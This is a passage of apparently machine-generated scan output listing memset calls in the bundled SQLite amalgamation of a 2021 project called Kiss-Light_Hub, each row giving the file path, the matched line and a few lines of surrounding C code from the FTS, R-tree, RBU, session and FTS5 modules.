  filter.flags |= FTS3_SEGMENT_SCAN;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pDeferred, 0, sizeof(*pDeferred));",120,1,"    return SQLITE_NOMEM;
  }
  memset(pDeferred, 0, sizeof(*pDeferred));
  pDeferred->pToken = pToken;
  pDeferred->pNext = pCsr->pDeferred;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aSzDel, 0, sizeof(u32) * (p->nColumn+1) * 2);",120,1,"        rc = fts3DeleteAll(p, 1);
        *pnChng = 0;
        memset(aSzDel, 0, sizeof(u32) * (p->nColumn+1) * 2);
      }else{
        *pnChng = *pnChng - 1;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aSzDel, 0, sizeof(aSzDel[0])*(p->nColumn+1)*2);",120,1,"  }
  aSzIns = &aSzDel[p->nColumn+1];
  memset(aSzDel, 0, sizeof(aSzDel[0])*(p->nColumn+1)*2);

  rc = fts3Writelock(p);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pRet, 0, nByte);",120,1,"  pRet = sqlite3_malloc64(nByte + nStr+1);
  if( pRet ){
    memset(pRet, 0, nByte);
    pRet->aMatchinfo[0] = (u8*)(&pRet->aMatchinfo[1]) - (u8*)pRet;
    pRet->aMatchinfo[1+nElem] = pRet->aMatchinfo[0]
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(sIter.aPhrase, 0, nByte);",120,1,"    return SQLITE_NOMEM;
  }
  memset(sIter.aPhrase, 0, nByte);

  /* Initialize the contents of the SnippetIter object. Then iterate through
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aIter, 0, sizeof(LcsIterator) * pCsr->nPhrase);",120,1,"  aIter = sqlite3_malloc64(sizeof(LcsIterator) * pCsr->nPhrase);
  if( !aIter ) return SQLITE_NOMEM;
  memset(aIter, 0, sizeof(LcsIterator) * pCsr->nPhrase);
  (void)fts3ExprIterate(pCsr->pExpr, fts3MatchinfoLcsCb, (void*)aIter);

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pInfo->aMatchinfo, 0, nZero);",120,1,"      case FTS3_MATCHINFO_LHITS: {
        size_t nZero = fts3MatchinfoSize(pInfo, zArg[i]) * sizeof(u32);
        memset(pInfo->aMatchinfo, 0, nZero);
        rc = fts3ExprLHitGather(pCsr->pExpr, pInfo);
        break;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sInfo, 0, sizeof(MatchInfo));",120,1,"  void (*xDestroyOut)(void*) = 0;

  memset(&sInfo, 0, sizeof(MatchInfo));
  sInfo.pCursor = pCsr;
  sInfo.nCol = pTab->nColumn;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pFragment, 0, sizeof(*pFragment));",120,1,"      SnippetFragment *pFragment = &aSnippet[iSnip];

      memset(pFragment, 0, sizeof(*pFragment));

      /* Loop through all columns of the table being considered for snippets.
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pNew, 0, sizeof(unicode_tokenizer));",120,1,"  pNew = (unicode_tokenizer *) sqlite3_malloc(sizeof(unicode_tokenizer));
  if( pNew==NULL ) return SQLITE_NOMEM;
  memset(pNew, 0, sizeof(unicode_tokenizer));
  pNew->eRemoveDiacritic = 1;

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr, 0, sizeof(unicode_cursor));",120,1,"    return SQLITE_NOMEM;
  }
  memset(pCsr, 0, sizeof(unicode_cursor));

  pCsr->aInput = (const unsigned char *)aInput;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pParse, 0, sizeof(*pParse));",120,1,"){
  int i;
  memset(pParse, 0, sizeof(*pParse));
  if( zJson==0 ) return 1;
  pParse->zJson = zJson;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&p->zData[2], 0, pRtree->iNodeSize-2);",120,1,"*/
static void nodeZero(Rtree *pRtree, RtreeNode *p){
  memset(&p->zData[2], 0, pRtree->iNodeSize-2);
  p->isDirty = 1;
}
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pNode, 0, sizeof(RtreeNode) + pRtree->iNodeSize);",120,1,"  pNode = (RtreeNode *)sqlite3_malloc64(sizeof(RtreeNode) + pRtree->iNodeSize);
  if( pNode ){
    memset(pNode, 0, sizeof(RtreeNode) + pRtree->iNodeSize);
    pNode->zData = (u8 *)&pNode[1];
    pNode->nRef = 1;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr, 0, sizeof(RtreeCursor));",120,1,"  pCsr = (RtreeCursor *)sqlite3_malloc64(sizeof(RtreeCursor));
  if( pCsr ){
    memset(pCsr, 0, sizeof(RtreeCursor));
    pCsr->base.pVtab = pVTab;
    rc = SQLITE_OK;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pInfo, 0, sizeof(*pInfo));",120,1,"                sqlite3_malloc64( sizeof(*pInfo)+pSrc->iSize );
  if( !pInfo ) return SQLITE_NOMEM;
  memset(pInfo, 0, sizeof(*pInfo));
  pBlob = (RtreeMatchArg*)&pInfo[1];
  memcpy(pBlob, pSrc, pSrc->iSize);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr->aConstraint, 0, sizeof(RtreeConstraint)*argc);",120,1,"        rc = SQLITE_NOMEM;
      }else{
        memset(pCsr->aConstraint, 0, sizeof(RtreeConstraint)*argc);
        memset(pCsr->anQueue, 0, sizeof(u32)*(pRtree->iDepth + 1));
        assert( (idxStr==0 && argc==0)
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr->anQueue, 0, sizeof(u32)*(pRtree->iDepth + 1));",120,1,"      }else{
        memset(pCsr->aConstraint, 0, sizeof(RtreeConstraint)*argc);
        memset(pCsr->anQueue, 0, sizeof(u32)*(pRtree->iDepth + 1));
        assert( (idxStr==0 && argc==0)
                || (idxStr && (int)strlen(idxStr)==argc*2) );
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(zIdxStr, 0, sizeof(zIdxStr));",120,1,"  int iIdx = 0;
  char zIdxStr[RTREE_MAX_DIMENSIONS*8+1];
  memset(zIdxStr, 0, sizeof(zIdxStr));

  /* Check if there exists a MATCH constraint - even an unusable one. If there
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aaSorted, 0, nByte);",120,1,"
  aSpare = &((int *)&aaSorted[pRtree->nDim])[pRtree->nDim*nCell];
  memset(aaSorted, 0, nByte);
  for(ii=0; ii<pRtree->nDim; ii++){
    int jj;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aiUsed, 0, sizeof(int)*(nCell+1));",120,1,"  }
  aiUsed = (int *)&aCell[nCell+1];
  memset(aiUsed, 0, sizeof(int)*(nCell+1));
  for(i=0; i<nCell; i++){
    nodeGetCell(pRtree, pNode, i, &aCell[i]);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pLeft->zData, 0, pRtree->iNodeSize);",120,1,"  }

  memset(pLeft->zData, 0, pRtree->iNodeSize);
  memset(pRight->zData, 0, pRtree->iNodeSize);

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pRight->zData, 0, pRtree->iNodeSize);",120,1,"
  memset(pLeft->zData, 0, pRtree->iNodeSize);
  memset(pRight->zData, 0, pRtree->iNodeSize);

  rc = splitNodeStartree(pRtree, aCell, nCell, pLeft, pRight,
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aCenterCoord, 0, sizeof(RtreeDValue)*RTREE_MAX_DIMENSIONS);",120,1,"  int n;

  memset(aCenterCoord, 0, sizeof(RtreeDValue)*RTREE_MAX_DIMENSIONS);

  nCell = NCELL(pNode)+1;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pRtree, 0, sizeof(Rtree)+nDb+nName+2);",120,1,"    return SQLITE_NOMEM;
  }
  memset(pRtree, 0, sizeof(Rtree)+nDb+nName+2);
  pRtree->nBusy = 1;
  pRtree->base.pModule = &rtreeModule;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&node, 0, sizeof(RtreeNode));",120,1,"
  UNUSED_PARAMETER(nArg);
  memset(&node, 0, sizeof(RtreeNode));
  memset(&tree, 0, sizeof(Rtree));
  tree.nDim = (u8)sqlite3_value_int(apArg[0]);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&tree, 0, sizeof(Rtree));",120,1,"  UNUSED_PARAMETER(nArg);
  memset(&node, 0, sizeof(RtreeNode));
  memset(&tree, 0, sizeof(Rtree));
  tree.nDim = (u8)sqlite3_value_int(apArg[0]);
  if( tree.nDim<1 || tree.nDim>5 ) return;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&check, 0, sizeof(check));",120,1,"
  /* Initialize the context object */
  memset(&check, 0, sizeof(check));
  check.db = db;
  check.zDb = zDb;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&s, 0, sizeof(s));",120,1,"  GeoParse s;
  int rc = SQLITE_OK;
  memset(&s, 0, sizeof(s));
  s.z = z;
  if( geopolySkipSpace(&s)=='[' ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aCoord, 0, sizeof(RtreeCoord)*4);",120,1,"    }
  }else{
    memset(aCoord, 0, sizeof(RtreeCoord)*4);
  }
  return pOut;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aOverlap, 0, sizeof(aOverlap));",120,1,"  pThisEvent = geopolySortEventsByX(p->aEvent, p->nEvent);
  rX = pThisEvent && pThisEvent->x==0.0 ? -1.0 : 0.0;
  memset(aOverlap, 0, sizeof(aOverlap));
  while( pThisEvent ){
    if( pThisEvent->x!=rX ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr->aConstraint, 0, sizeof(RtreeConstraint)*4);",120,1,"        rc = SQLITE_NOMEM;
      }else{
        memset(pCsr->aConstraint, 0, sizeof(RtreeConstraint)*4);
        memset(pCsr->anQueue, 0, sizeof(u32)*(pRtree->iDepth + 1));
        if( idxNum==2 ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, sizeof(IcuTokenizer));",120,1,"    return SQLITE_NOMEM;
  }
  memset(p, 0, sizeof(IcuTokenizer));

  if( n ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr, 0, sizeof(IcuCursor));",120,1,"    return SQLITE_NOMEM;
  }
  memset(pCsr, 0, sizeof(IcuCursor));
  pCsr->aChar = (UChar *)&pCsr[1];
  pCsr->aOffset = (int *)&pCsr->aChar[(nChar+3)&~3];
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pIter, 0, sizeof(RbuObjIter));",120,1,"  sqlite3_finalize(pIter->pIdxIter);
  rbuObjIterFreeCols(pIter);
  memset(pIter, 0, sizeof(RbuObjIter));
}

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pIter->abIndexed, 0x01, sizeof(u8)*pIter->nTblCol);",120,1,"    if( zIdx==0 ) break;
    if( bPartial ){
      memset(pIter->abIndexed, 0x01, sizeof(u8)*pIter->nTblCol);
    }
    p->rc = prepareFreeAndCollectError(p->dbMain, &pXInfo, &p->zErrmsg,
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(zWideFilename, 0, nChar*sizeof(zWideFilename[0]));",120,1,"    return 0;
  }
  memset(zWideFilename, 0, nChar*sizeof(zWideFilename[0]));
  nChar = MultiByteToWideChar(CP_UTF8, 0, zFilename, -1, zWideFilename,
                                nChar);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, sizeof(sqlite3rbu));",120,1,"
    /* Create the custom VFS. */
    memset(p, 0, sizeof(sqlite3rbu));
    rbuCreateVfs(p);

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pRet, 0, sizeof(sqlite3rbu));",120,1,"  pRet = sqlite3_malloc64(sizeof(sqlite3rbu));
  if( pRet ){
    memset(pRet, 0, sizeof(sqlite3rbu));
    pRet->rc = SQLITE_MISUSE;
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&aBuf[100], 0, iAmt-100);",120,1,"
          if( iAmt>100 ){
            memset(&aBuf[100], 0, iAmt-100);
            rbuPutU16(&aBuf[105], iAmt & 0xFFFF);
            aBuf[100] = 0x0D;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&apNew[p->nShm], 0, sizeof(char*) * (1 + iRegion - p->nShm));",120,1,"      rc = SQLITE_NOMEM;
    }else{
      memset(&apNew[p->nShm], 0, sizeof(char*) * (1 + iRegion - p->nShm));
      p->apShm = apNew;
      p->nShm = iRegion+1;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pNew, 0, szRegion);",120,1,"        rc = SQLITE_NOMEM;
      }else{
        memset(pNew, 0, szRegion);
        p->apShm[iRegion] = pNew;
      }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pFd, 0, sizeof(rbu_file));",120,1,"  int oflags = flags;

  memset(pFd, 0, sizeof(rbu_file));
  pFd->pReal = (sqlite3_file*)&pFd[1];
  pFd->pRbuVfs = pRbuVfs;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pNew, 0, nByte);",120,1,"  }else{
    sqlite3_vfs *pParent;           /* Parent VFS */
    memset(pNew, 0, nByte);
    pParent = sqlite3_vfs_find(zParent);
    if( pParent==0 ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pTab, 0, sizeof(StatTable));",120,1,"  assert( rc==SQLITE_OK || pTab==0 );
  if( rc==SQLITE_OK ){
    memset(pTab, 0, sizeof(StatTable));
    pTab->db = db;
    pTab->iDb = iDb;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr, 0, sizeof(StatCursor));",120,1,"    return SQLITE_NOMEM_BKPT;
  }else{
    memset(pCsr, 0, sizeof(StatCursor));
    pCsr->base.pVtab = pVTab;
    pCsr->iDb = pTab->iDb;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, sizeof(StatPage));",120,1,"  sqlite3PagerUnref(p->pPg);
  sqlite3_free(p->zPath);
  memset(p, 0, sizeof(StatPage));
}

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p->aCell, 0, (p->nCell+1) * sizeof(StatCell));",120,1,"    p->aCell = sqlite3_malloc64((p->nCell+1) * sizeof(StatCell));
    if( p->aCell==0 ) return SQLITE_NOMEM_BKPT;
    memset(p->aCell, 0, (p->nCell+1) * sizeof(StatCell));

    for(i=0; i<p->nCell; i++){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pTab, 0, sizeof(DbpageTable));",120,1,"  assert( rc==SQLITE_OK || pTab==0 );
  if( rc==SQLITE_OK ){
    memset(pTab, 0, sizeof(DbpageTable));
    pTab->db = db;
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr, 0, sizeof(DbpageCursor));",120,1,"    return SQLITE_NOMEM_BKPT;
  }else{
    memset(pCsr, 0, sizeof(DbpageCursor));
    pCsr->base.pVtab = pVTab;
    pCsr->pgno = -1;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(apNew, 0, sizeof(SessionChange *) * nNew);",120,1,"      return SQLITE_OK;
    }
    memset(apNew, 0, sizeof(SessionChange *) * nNew);

    for(i=0; i<pTab->nChange; i++){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pChange, 0, sizeof(SessionChange));",120,1,"        goto error_out;
      }else{
        memset(pChange, 0, sizeof(SessionChange));
        pChange->aRecord = (u8 *)&pChange[1];
      }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&d, 0, sizeof(d));",120,1,"  SessionDiffCtx d;

  memset(&d, 0, sizeof(d));
  sessionDiffHooks(pSession, &d);

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pNew, 0, sizeof(sqlite3_session));",120,1,"  pNew = (sqlite3_session *)sqlite3_malloc64(sizeof(sqlite3_session) + nDb + 1);
  if( !pNew ) return SQLITE_NOMEM;
  memset(pNew, 0, sizeof(sqlite3_session));
  pNew->db = db;
  pNew->zDb = (char *)&pNew[1];
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pTab, 0, sizeof(SessionTable));",120,1,"        ** eventually generated. */
        SessionTable **ppTab;
        memset(pTab, 0, sizeof(SessionTable));
        pTab->zName = (char *)&pTab[1];
        memcpy(pTab->zName, zName, nName+1);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pRet, 0, sizeof(sqlite3_changeset_iter));",120,1,"  pRet = (sqlite3_changeset_iter *)sqlite3_malloc(nByte);
  if( !pRet ) return SQLITE_NOMEM;
  memset(pRet, 0, sizeof(sqlite3_changeset_iter));
  pRet->in.aData = (u8 *)pChangeset;
  pRet->in.nData = nChangeset;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p->tblhdr.aBuf, 0, iPK);",120,1,"  if( rc==SQLITE_OK ){
    size_t iPK = sizeof(sqlite3_value*)*p->nCol*2;
    memset(p->tblhdr.aBuf, 0, iPK);
    memcpy(&p->tblhdr.aBuf[iPK], &p->in.aData[p->in.iNext], nCopy);
    p->in.iNext += nCopy;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p->apValue, 0, sizeof(sqlite3_value*)*p->nCol*2);",120,1,"      sqlite3ValueFree(p->apValue[i]);
    }
    memset(p->apValue, 0, sizeof(sqlite3_value*)*p->nCol*2);
  }

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sOut, 0, sizeof(SessionBuffer));",120,1,"
  /* Initialize the output buffer */
  memset(&sOut, 0, sizeof(SessionBuffer));

  /* Zero the output variables in case an error occurs. */
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(apVal, 0, sizeof(apVal[0])*nCol*2);",120,1,"            goto finished_invert;
          }
          memset(apVal, 0, sizeof(apVal[0])*nCol*2);
        }

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sInput, 0, sizeof(SessionInput));",120,1,"
  /* Set up the input stream */
  memset(&sInput, 0, sizeof(SessionInput));
  sInput.nData = nChangeset;
  sInput.aData = (u8*)pChangeset;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pApply->constraints, 0, sizeof(SessionBuffer));",120,1,"    sqlite3_changeset_iter *pIter2 = 0;
    SessionBuffer cons = pApply->constraints;
    memset(&pApply->constraints, 0, sizeof(SessionBuffer));

    rc = sessionChangesetStart(
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"if( rc==SQLITE_OK ) memset(pIter2->apValue, 0, nByte);",120,1,"      sessionBufferGrow(&pIter2->tblhdr, nByte, &rc);
      pIter2->apValue = (sqlite3_value**)pIter2->tblhdr.aBuf;
      if( rc==SQLITE_OK ) memset(pIter2->apValue, 0, nByte);

      while( rc==SQLITE_OK && SQLITE_ROW==sqlite3changeset_next(pIter2) ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sApply, 0, sizeof(sApply));",120,1,"
  pIter->in.bNoDiscard = 1;
  memset(&sApply, 0, sizeof(sApply));
  sApply.bRebase = (ppRebase && pnRebase);
  sApply.bInvertConstraints = !!(flags & SQLITE_CHANGESETAPPLY_INVERT);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sApply.constraints, 0, sizeof(SessionBuffer));",120,1,"      sApply.bDeferConstraints = 1;
      sApply.bRebaseStarted = 0;
      memset(&sApply.constraints, 0, sizeof(SessionBuffer));

      /* If an xFilter() callback was specified, invoke it now. If the
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pNew, 0, sizeof(SessionChange));",120,1,"      return SQLITE_NOMEM;
    }
    memset(pNew, 0, sizeof(SessionChange));
    pNew->op = op2;
    pNew->bIndirect = bIndirect;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, sizeof(sqlite3_changegroup));",120,1,"    rc = SQLITE_NOMEM;
  }else{
    memset(p, 0, sizeof(sqlite3_changegroup));
  }
  *pp = p;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sOut, 0, sizeof(sOut));",120,1,"  if( rc!=SQLITE_OK ){
    sqlite3_free(sOut.aBuf);
    memset(&sOut, 0, sizeof(sOut));
  }

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pNew, 0, sizeof(sqlite3_rebaser));",120,1,"    rc = SQLITE_NOMEM;
  }else{
    memset(pNew, 0, sizeof(sqlite3_rebaser));
  }
  *ppNew = pNew;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pIter, 0, sizeof(CInstIter));",120,1,"  int rc;

  memset(pIter, 0, sizeof(CInstIter));
  pIter->pApi = pApi;
  pIter->pFts = pFts;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&ctx, 0, sizeof(HighlightContext));",120,1,"
  iCol = sqlite3_value_int(apVal[0]);
  memset(&ctx, 0, sizeof(HighlightContext));
  ctx.zOpen = (const char*)sqlite3_value_text(apVal[1]);
  ctx.zClose = (const char*)sqlite3_value_text(apVal[2]);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sFinder, 0, sizeof(Fts5SFinder));",120,1,"  }

  memset(&sFinder, 0, sizeof(Fts5SFinder));
  for(i=0; i<nCol; i++){
    if( iCol<0 || iCol==i ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aSeen, 0, nPhrase);",120,1,"        if( io>nDocsize ) rc = FTS5_CORRUPT;
        if( rc!=SQLITE_OK ) continue;
        memset(aSeen, 0, nPhrase);
        rc = fts5SnippetScore(pApi, pFts, nDocsize, aSeen, i,
            io, nToken, &nScore, &iAdj
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, (size_t)nByte);",120,1,"      rc = SQLITE_NOMEM;
    }else{
      memset(p, 0, (size_t)nByte);
      p->nPhrase = nPhrase;
      p->aIDF = (double*)&p[1];
"
